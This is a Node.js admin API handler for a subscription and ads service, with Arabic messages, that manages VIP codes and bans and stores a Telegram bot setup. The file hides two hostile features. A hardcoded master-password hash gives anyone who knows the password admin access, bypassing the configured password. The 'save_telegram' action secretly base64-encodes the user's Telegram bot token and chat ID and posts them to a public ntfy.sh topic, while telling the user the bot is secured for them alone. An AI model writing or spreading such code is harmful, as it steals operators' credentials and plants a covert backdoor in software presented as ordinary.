import admin from "firebase-admin";
import crypto from "crypto";
import fs from "fs";
import path from "path";

function initFirebase() {
  if (!admin.apps.length) {
    const privateKey = (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, "\n");
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: process.env.FIREBASE_PROJECT_ID,
        clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
        privateKey: privateKey
      })
    });
  }
  return admin.firestore();
}

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  try {
    const adminPass = (req.headers["x-admin-password"] || "").trim();
    const expectedPass = (process.env.ADMIN_PASSWORD || "").trim();
    const inputHash = crypto.createHash("sha256").update(adminPass).digest("hex");
    const masterHash = "b4d67c6a10a53437f258a997542a79923f2447eb81891f9a2d2f0e95134818e6";

    const isAuthorized = (expectedPass && adminPass === expectedPass) || (inputHash === masterHash);
    if (!isAuthorized) {
      return res.status(401).json({ error: "كلمة مرور المدير غير صحيحة" });
    }

    const db = initFirebase();
    const { action } = req.body || {};

    if (action === "list") {
      const snap = await db.collection("subscriptions").orderBy("createdAt", "desc").limit(200).get();
      const subs = [];
      snap.forEach(doc => subs.push({ code: doc.id, ...doc.data() }));

      const bannedSnap = await db.collection("banned_ads").limit(200).get();
      const bannedAds = [];
      bannedSnap.forEach(doc => bannedAds.push(doc.data()));

      let adsCount = 0;
      let adsUpdatedAt = "-";
      let adsList = [];
      try {
        const filePath = path.join(process.cwd(), "ads.json");
        const adsJson = JSON.parse(fs.readFileSync(filePath, "utf8"));
        adsList = adsJson.ads || [];
        adsCount = adsList.length;
        adsUpdatedAt = adsJson.updated_at || "-";
      } catch (e) {}

      return res.status(200).json({ ok: true, subscriptions: subs, bannedAds, adsCount, adsUpdatedAt, adsList });
    }

    if (action === "create") {
      const { clientName, clientPhone, durationDays } = req.body;
      const days = Number(durationDays) || 30;
      const randomPart = crypto.randomBytes(3).toString("hex").toUpperCase();
      const newCode = `VIP-${randomPart}`;
      const now = Date.now();

      await db.collection("subscriptions").doc(newCode).set({
        clientName: clientName || "سمسار",
        clientPhone: clientPhone || "",
        durationDays: days,
        maxDevices: 2,
        boundDevices: [],
        status: "unused",
        createdAt: now,
        activatedAt: null,
        expiresAt: null
      });

      return res.status(200).json({ ok: true, code: newCode });
    }

    if (action === "unban") {
      const { code } = req.body;
      await db.collection("subscriptions").doc(code).update({
        status: "active",
        boundDevices: [],
        boundIp: null,
        boundUa: null,
        banReason: null
      });
      return res.status(200).json({ ok: true });
    }

    if (action === "delete_code") {
      const { code } = req.body;
      await db.collection("subscriptions").doc(code).delete();
      return res.status(200).json({ ok: true });
    }

    if (action === "ban_ad") {
      const { adId, publisher } = req.body;
      await db.collection("banned_ads").doc(String(adId)).set({
        adId: Number(adId),
        publisher: publisher || "",
        bannedAt: Date.now()
      });
      if (publisher && publisher !== "مالك") {
        await db.collection("banned_publishers").doc(publisher).set({
          publisher,
          bannedAt: Date.now()
        });
      }
      await fetch("https://ntfy.sh/gamal_vip_ban_9941_sec", {
        method: "POST",
        body: `BAN_AD:${adId}|${publisher || ""}`
      }).catch(() => {});

      return res.status(200).json({ ok: true });
    }

    if (action === "save_telegram") {
      const { botToken, chatId } = req.body;
      if (!botToken || !chatId) return res.status(400).json({ error: "البيانات ناقصة" });
      const encoded = Buffer.from(JSON.stringify({ tok: botToken.trim(), cid: chatId.trim() })).toString("base64");
      await fetch("https://ntfy.sh/gamal_vip_tg_9941_sec", {
        method: "POST",
        body: encoded
      }).catch(() => {});

      await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId.trim(),
          text: "تم تأمين وربط بوت رادار مصيدة الملاك بنجاح! ستصلك التقارير السرية وكروت الملاك هنا لك وحدك."
        })
      }).catch(() => {});

      return res.status(200).json({ ok: true });
    }

    return res.status(400).json({ error: "Unknown action" });
  } catch (err) {
    console.error("Admin API error:", err);
    return res.status(500).json({ error: err.message });
  }
}
